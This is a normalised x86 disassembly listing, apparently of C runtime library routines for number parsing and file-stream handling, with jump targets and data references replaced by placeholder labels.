push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
call sub_414048
mov eax [ ebp + 0xc ]
xor esi esi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp eax edi
jl r-xdata
movzx esi [ eax ]
add eax edi
push 0x8
push esi
mov [ ebp + 0xc ] eax
call sub_41c837
pop ecx
pop ecx
test eax eax
jne r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
cmp eax 0x24
jle r-xdata
mov eax [ ebp + 0xc ]
xor ebx ebx
cmp [ ebp + 0x18 ] bl
setne bl
cmp si 0x2d
jne r-xdata
cmp si 0x2b
jne r-xdata
or ebx edi
jmp r-xdata
mov edi [ ebp + 0xc ]
mov edi [ ebp + 0xc ]
movzx esi [ edi ]
add edi 0x2
mov [ ebp + 0xc ] edi
jmp r-xdata
cmp si ax
jb r-xdata
cmp ecx edx
jne r-xdata
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x4 ] 0x19
push 0x30
pop eax
push 0x10
pop edx
test ecx ecx
je r-xdata
push 0x41
pop eax
cmp ax si
ja r-xdata
push 0x3a
pop eax
cmp si ax
jae r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
mov ecx eax
lea eax [ esi - 0x61 ]
cmp ax [ ebp - 0x4 ]
ja r-xdata
push 0x5a
pop eax
cmp si ax
jbe r-xdata
mov eax 0xff10
cmp si ax
jae r-xdata
movzx eax si
sub eax 0x30
jmp r-xdata
push 0x41
pop eax
cmp ax si
ja r-xdata
push 0x3a
pop eax
cmp si ax
jae r-xdata
or eax 0xffffffff
lea eax [ esi - 0x61 ]
cmp ax [ ebp - 0x4 ]
movzx eax si
ja r-xdata
mov eax 0xff1a
cmp si ax
jae r-xdata
mov eax 0x660
cmp si ax
jb r-xdata
cmp eax 0xffffffff
jne r-xdata
lea eax [ esi - 0x61 ]
cmp ax [ ebp - 0x4 ]
ja r-xdata
push 0x5a
pop eax
cmp si ax
jbe r-xdata
mov eax 0xff10
cmp si ax
jae r-xdata
movzx eax si
sub eax 0x30
jmp r-xdata
movzx eax [ edi ]
add edi 0x2
mov [ ebp + 0xc ] edi
cmp eax 0x78
je r-xdata
test ecx ecx
jne r-xdata
add eax 0xffffffc9
jmp r-xdata
sub eax 0x20
or eax 0xffffffff
movzx eax si
sub eax 0xff10
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
test eax eax
je r-xdata
or eax 0xffffffff
lea eax [ esi - 0x61 ]
cmp ax [ ebp - 0x4 ]
movzx eax si
ja r-xdata
mov eax 0xff1a
cmp si ax
jae r-xdata
mov eax 0x660
cmp si ax
jb r-xdata
cmp eax 0xffffffff
jne r-xdata
test ecx ecx
jne r-xdata
cmp eax 0x58
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
mov eax 0x6f0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x660
jmp r-xdata
push esi
lea ecx [ ebp + 0xc ]
call sub_415ffe
test bl 0x8
jne r-xdata
cmp eax [ ebp + 0x14 ]
jae r-xdata
add eax 0xffffffc9
jmp r-xdata
sub eax 0x20
or eax 0xffffffff
movzx eax si
sub eax 0xff10
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
cmp eax 0xffffffff
je r-xdata
movzx esi [ edi ]
add edi 0x2
mov [ ebp + 0xc ] edi
mov [ ebp + 0x14 ] edx
test ecx ecx
jne r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov esi [ ebp - 0x8 ]
push esi
push ebx
call sub_41567b
pop ecx
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0xc ]
xor ebx ebx
mov [ ebp + 0xc ] eax
jmp r-xdata
mov esi [ ebp - 0x8 ]
or ebx 0x8
cmp esi ecx
jb r-xdata
mov eax 0x6f0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x660
jmp r-xdata
push eax
lea ecx [ ebp + 0xc ]
call sub_415ffe
mov edi [ ebp + 0xc ]
jmp r-xdata
mov [ ebp + 0x14 ] 0x8
mov eax 0x966
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x6f0
jmp r-xdata
test bl 0x2
je r-xdata
call sub_41529e
mov [ eax ] 0x22
test bl 0x1
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
pop esi
je r-xdata
imul esi [ ebp + 0x14 ]
add esi eax
mov [ ebp - 0x8 ] esi
jne r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov ebx esi
neg esi
test bl 0x2
je r-xdata
or esi 0xffffffff
jmp r-xdata
mov edx [ ebp + 0x10 ]
test edx edx
je r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x350 ] 0xfffffffd
jmp r-xdata
push 0x30
pop eax
cmp si ax
jb r-xdata
or ebx 0x4
jmp r-xdata
cmp eax edx
jbe r-xdata
mov eax 0x966
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x6f0
jmp r-xdata
mov eax 0x9e6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x966
jmp r-xdata
mov ebx 0x7fffffff
jmp r-xdata
mov ebx 0x80000000
jmp r-xdata
movzx esi [ edi ]
add edi 0x2
mov [ ebp + 0xc ] edi
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0x9e6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x966
jmp r-xdata
mov eax 0xa66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x9e6
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xa66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x9e6
jmp r-xdata
mov eax 0xae6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xa66
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xae6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xa66
jmp r-xdata
mov eax 0xb66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xae6
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xb66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xae6
jmp r-xdata
mov eax 0xc66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xb66
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xc66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xb66
jmp r-xdata
mov eax 0xce6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xc66
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xce6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xc66
jmp r-xdata
mov eax 0xd66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xce6
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xd66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xce6
jmp r-xdata
mov eax 0xe50
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xd66
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xe50
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xd66
jmp r-xdata
mov eax 0xed0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xe50
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xed0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xe50
jmp r-xdata
mov eax 0xf20
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xed0
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xf20
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xed0
jmp r-xdata
mov eax 0x1040
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xf20
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0x1040
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xf20
jmp r-xdata
mov eax 0x17e0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x1040
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0x17e0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x1040
jmp r-xdata
mov eax 0x1810
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x17e0
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0x1810
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x17e0
jmp r-xdata
movzx eax si
sub eax 0x1810
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
movzx eax si
sub eax 0x1810
jmp r-xdata
sub_415fd6
mov edi edi
push ebp
mov ebp esp
dec [ ecx ]
mov al [ ebp + 0x8 ]
mov ecx [ ecx ]
test al al
je r-xdata
pop ebp
retn 0x4
cmp [ ecx ] al
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
sub_415ffe
mov edi edi
push ebp
mov ebp esp
add [ ecx ] 0xfffffffe
mov ax [ ebp + 0x8 ]
mov ecx [ ecx ]
test ax ax
je r-xdata
pop ebp
retn 0x4
cmp [ ecx ] ax
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
sub_416045
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_41948b
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
mov eax [ eax ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
and eax [ ebp + 0xc ]
pop ebp
retn
sub_41606f
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_416045
mov eax [ ecx ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41c896
jmp r-xdata
add esp 0xc
pop ebp
retn
sub_4160a2
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
push ecx
push ecx
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_4156ae
add esp 0xc
push 0x0
call sub_4158f1
add esp 0x14
mov esp ebp
pop ebp
retn
sub_4160cc
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
push ecx
push ecx
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_4156ae
add esp 0xc
push 0x0
call sub_4156c9
add esp 0x14
mov esp ebp
pop ebp
retn
sub_416100
push ebx
push esi
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x10 ]
mov ebx [ esp + 0x14 ]
test ebx 0xffffffff
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub ecx edx
test edx 0x3
je r-xdata
lea eax [ edx + ecx ]
and eax 0xfff
cmp eax 0xffc
ja r-xdata
movzx eax [ edx + ecx ]
cmp al [ edx ]
jne r-xdata
mov eax [ edx + ecx ]
cmp eax [ edx ]
jne r-xdata
sbb eax eax
or eax 0x1
pop esi
pop ebx
retn
test eax eax
je r-xdata
sub ebx 0x4
jbe r-xdata
inc edx
sub ebx 0x1
jbe r-xdata
lea esi [ eax - 0x1010101 ]
add edx 0x4
not eax
and eax esi
test eax 0x80808080
je r-xdata
test dl 0x3
jne r-xdata
sub_416178
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
lea esi [ ecx + 0xc ]
mov eax [ esi ]
and al 0x3
cmp al 0x2
je r-xdata
mov eax [ esi ]
test al 0xc0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ecx + 0x4 ]
push edi
mov edi [ ecx ]
sub edi eax
mov [ ecx ] eax
and [ ecx + 0x8 ] 0x0
test edi edi
jle r-xdata
pop esi
pop ebp
retn
xor eax eax
push edi
push eax
push ecx
call sub_41b8cf
pop ecx
push eax
call sub_41d027
add esp 0xc
cmp edi eax
je r-xdata
mov eax [ esi ]
shr eax 0x2
test al 0x1
je r-xdata
push 0x10
pop eax
[ esi ] eax
or eax 0xffffffff
jmp r-xdata
push 0xfffffffd
pop eax
[ esi ] eax
pop edi
sub_4161de
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_416178
pop ecx
test eax eax
je r-xdata
push esi
call sub_41622e
pop ecx
jmp r-xdata
mov eax [ esi + 0xc ]
shr eax 0xb
test al 0x1
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_41b8cf
push eax
call sub_41ca28
pop ecx
pop ecx
test eax eax
jne r-xdata
sub_41622e
push 0x1c
push r--data
call sub_40e2a0
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x24 ] 0x0
push 0x8
call sub_4191c3
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov eax [ rw-data ]
lea eax [ esi + eax * 4 ]
mov [ ebp - 0x2c ] eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4162fd
cmp ebx 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov edi [ esi ]
mov [ ebp - 0x28 ] edi
test edi edi
je r-xdata
call sub_40e2e6
retn
mov eax [ ebp - 0x24 ]
add esi 0x4
jmp r-xdata
push edi
call sub_416c9b
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0xc ]
shr eax 0xd
test al 0x1
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_4162d3
mov eax [ ebp - 0x2c ]
cmp ebx 0x1
jne r-xdata
test ebx ebx
jne r-xdata
push edi
call sub_4161de
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ edi + 0xc ]
shr eax 0x1
test al 0x1
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push edi
call sub_4161de
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_416306
push 0xc
push r--data
call sub_40e2a0
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
and [ ebp - 0x1c ] 0x0
push esi
call sub_416c9b
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_4161de
pop ecx
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_416357
mov eax edi
push esi
call sub_41622e
pop ecx
jmp r-xdata
call sub_40e2e6
retn
sub_41635f
push 0xc
push r--data
call sub_40e2a0
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_416c9b
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_4163d8
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4163a4
mov eax esi
call sub_40e2e6
retn 0xc
sub_4163b0
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_41635f
mov esp ebp
pop ebp
retn
sub_4163d8
mov edi edi
push ebx
push esi
push edi
mov edi ecx
mov eax [ edi ]
mov ebx [ eax ]
mov eax [ edi + 0x4 ]
and ebx 0xfffffffe
push [ eax ]
call sub_416178
mov eax [ edi + 0x4 ]
push [ eax ]
call sub_41d31e
mov eax [ edi + 0x4 ]
pop ecx
pop ecx
mov ecx 0xfffff81f
mov eax [ eax ]
add eax 0xc
[ eax ] ecx
mov eax [ edi + 0x8 ]
test [ eax ] 0x4
je r-xdata
mov eax [ edi + 0xc ]
mov eax [ eax ]
test eax eax
jne r-xdata
mov ecx [ edi + 0x4 ]
push 0x400
push 0x2
mov eax [ ecx ]
add eax 0x14
push eax
push [ ecx ]
jmp r-xdata
push 0x180
push ebx
push eax
push ebx
call sub_419b3e
push 0x0
mov esi eax
call sub_41a3a5
pop ecx
pop ecx
test esi esi
jne r-xdata
call sub_416472
add esp 0x10
push 0x140
push ebx
push esi
jmp r-xdata
inc [ rw-data ]
or eax 0xffffffff
jmp r-xdata
mov eax [ edi + 0x4 ]
push [ eax ]
pop edi
pop esi
pop ebx
retn
sub_416472
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
add eax 0xc
[ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
mov [ ecx + 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov eax [ ebp + 0x8 ]
and [ eax + 0x8 ] 0x0
xor eax eax
pop ebp
retn
sub_4164a5
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x4
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x14 ]
add eax 0xfffffffe
cmp eax 0x7ffffffd
ja r-xdata
cmp eax 0x40
jne r-xdata
cmp eax 0x40
jne r-xdata
lea eax [ ebp + 0x14 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
push ecx
call sub_4163b0
pop ecx
pop ecx
sub_41651b
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
or eax 0xffffffff
pop ebp
retn
push 0x0
push [ eax + 0x4 ]
push [ eax ]
push [ ebp + 0x8 ]
call sub_416810
add esp 0x10
pop ebp
retn
sub_416556
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
sub esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
sbb edi [ ebp + 0x14 ]
xor ecx ecx
xor eax eax
inc ecx
cmp [ ebp + 0xc ] eax
jg r-xdata
mov ebx eax
jl r-xdata
mov edx eax
jl r-xdata
mov ebx ecx
jmp r-xdata
cmp [ ebp + 0x8 ] eax
jae r-xdata
mov ecx [ ebp + 0x18 ]
mov [ ecx ] esi
mov [ ecx + 0x4 ] edi
cmp [ ebp + 0xc ] eax
jg r-xdata
mov edx ecx
jmp r-xdata
cmp [ ebp + 0x10 ] eax
jae r-xdata
cmp [ ebp + 0x14 ] eax
jg r-xdata
mov edx eax
jl r-xdata
cmp ebx edx
je r-xdata
mov ecx eax
jl r-xdata
mov edx ecx
jmp r-xdata
cmp [ ebp + 0x8 ] eax
jae r-xdata
mov eax [ ebp + 0x18 ]
or [ eax ] 0xffffffff
or [ eax + 0x4 ] 0xffffffff
mov eax 0x80070216
jmp r-xdata
cmp edx ecx
je r-xdata
cmp esi eax
jb r-xdata
cmp edi eax
jg r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4165d7
push 0xc
push r--data
call sub_40e2a0
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
jne r-xdata
mov esi [ ebp + 0x14 ]
test esi esi
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
or eax 0xffffffff
jmp r-xdata
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_416c9b
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_416737
add esp 0x10
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_416654
mov eax esi
cmp esi 0x1
je r-xdata
call sub_40e2e6
retn
cmp esi 0x2
jne r-xdata
sub_41665e
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x2
push edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
test eax 0x4c0
je r-xdata
xor al al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
test al 0x6
jne r-xdata
pop edi
pop ebp
retn
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp [ eax + 0x8 ] esi
jl r-xdata
xor al al
mov edx [ eax + 0x10 ]
mov eax edx
mov ecx edx
and eax 0x3f
sar ecx 0x6
imul eax eax 0x30
mov ecx [ ecx * 4 + rw-data ]
test [ ecx + eax + 0x28 ] 0x80
jne r-xdata
cmp [ ecx + eax + 0x29 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] esi
jne r-xdata
mov esi [ ebp + 0x8 ]
push 0x1
push esi
push esi
push edx
call sub_41da40
mov edi edx
add esp 0x10
mov ecx eax
cmp edi esi
jg r-xdata
mov edi [ ebp + 0xc ]
jl r-xdata
mov esi [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
mov eax [ esi + 0x8 ]
cdq
sub ecx eax
sbb edi edx
push edi
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_416556
add esp 0x14
test eax eax
jns r-xdata
jl r-xdata
mov eax [ esi + 0x8 ]
cdq
cmp [ ebp + 0x10 ] edx
jg r-xdata
cmp eax edi
ja r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
sub eax ecx
cdq
cmp edx [ ebp + 0x10 ]
jg r-xdata
cmp ecx esi
jb r-xdata
jl r-xdata
add ecx edi
mov al 0x1
mov [ esi ] ecx
mov ecx [ ebp + 0x8 ]
sub [ ecx + 0x8 ] edi
jmp r-xdata
cmp edi eax
ja r-xdata
pop esi
sub_416737
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
shr eax 0xd
test al 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0xfffffff7
pop ecx
add eax 0xc
[ eax ] ecx
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
push esi
push edi
push ebx
push [ ebp + 0x8 ]
call sub_41665e
add esp 0x10
test al al
jne r-xdata
call sub_41529e
mov [ eax ] 0x16
or eax 0xffffffff
pop ebp
retn
xor eax eax
cmp esi 0x1
jne r-xdata
push [ ebp + 0x8 ]
call sub_416178
mov eax [ ebp + 0x8 ]
pop ecx
mov ecx [ eax + 0x4 ]
and [ eax + 0x8 ] 0x0
mov [ eax ] ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
shr eax 0x2
test al 0x1
mov eax [ ebp + 0x8 ]
je r-xdata
push [ ebp + 0x8 ]
call sub_41d897
add ebx eax
pop ecx
adc edi edx
xor esi esi
mov eax [ eax + 0xc ]
and eax 0x41
cmp al 0x41
jne r-xdata
push 0xfffffffc
pop ecx
add eax 0xc
[ eax ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push esi
push edi
push ebx
push eax
call sub_41da40
and eax edx
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
shr eax 0x8
test al 0x1
jne r-xdata
or eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] 0x200
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41682b
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
cdq
push edx
push eax
push [ ebp + 0x8 ]
call sub_4165d7
add esp 0x10
pop ebp
retn
sub_416846
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
or eax 0xffffffff
pop ebp
retn
push [ ebp + 0x8 ]
call sub_41d88c
pop ecx
mov ecx eax
mov [ esi ] eax
and ecx edx
mov [ esi + 0x4 ] edx
or eax 0xffffffff
cmp ecx eax
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
sub_4168a1
push 0xc
push r--data
call sub_40e2a0
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_416c9b
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_41691a
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4168e6
mov eax esi
call sub_40e2e6
retn 0xc
sub_4168f2
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_4168a1
mov esp ebp
pop ebp
retn
sub_41691a
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov eax [ esi ]
mov edi [ eax ]
push edi
call sub_41b90a
mov [ ebp - 0x4 ] al
mov eax [ esi ]
push [ eax ]
mov eax [ esi + 0xc ]
push [ eax ]
mov eax [ esi + 0x8 ]
push [ eax ]
mov eax [ esi + 0x4 ]
push [ eax ]
call sub_416960
push edi
push [ ebp - 0x4 ]
mov esi eax
call sub_41b9bf
add esp 0x1c
mov eax esi
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_416960
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
mov ebx [ ebp + 0x14 ]
test ebx ebx
jne r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
or eax 0xffffffff
xor edx edx
div esi
cmp edi eax
ja r-xdata
lea eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
test eax 0x4c0
je r-xdata
mov edx 0x1000
mov edx [ ebx + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov eax [ ebx + 0xc ]
test al 0xc0
je r-xdata
imul esi edi
mov [ ebp - 0x4 ] edx
mov edi esi
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp edi edx
jb r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
movsx eax [ ecx ]
push ebx
push eax
call sub_41c7cf
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebx + 0xc ]
test al 0xc0
je r-xdata
js r-xdata
sub esi edi
xor edx edx
mov eax esi
div [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebx + 0x18 ]
inc ecx
dec edi
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x4 ] edx
test edx edx
jg r-xdata
mov eax edi
test edx edx
je r-xdata
push ebx
call sub_416178
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
push 0x10
pop ecx
[ eax ] ecx
cmp edi eax
jae r-xdata
test edi edi
jne r-xdata
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edi
xor edx edx
div [ ebp - 0x4 ]
mov eax edi
sub eax edx
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
push eax
push ecx
push [ ebx ]
call sub_4117a0
mov eax [ ebp - 0x8 ]
add esp 0xc
sub [ ebx + 0x8 ] eax
sub edi eax
mov ecx [ ebp + 0x8 ]
add [ ebx ] eax
add ecx eax
mov [ ebp + 0x8 ] ecx
jmp r-xdata
mov eax edi
mov [ ebp - 0x8 ] edi
push eax
push ecx
push ebx
call sub_41b8cf
pop ecx
push eax
call sub_41d027
add esp 0xc
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
mov [ ebp - 0x8 ] eax
cmp eax 0xffffffff
jb r-xdata
mov edx [ ebp - 0x4 ]
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov edx ecx
cmp eax ecx
ja r-xdata
add [ ebp + 0x8 ] edx
sub edi edx
cmp eax ecx
jb r-xdata
mov edx eax
mov ecx [ ebp + 0x8 ]
sub_416ad9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0xc ] 0x0
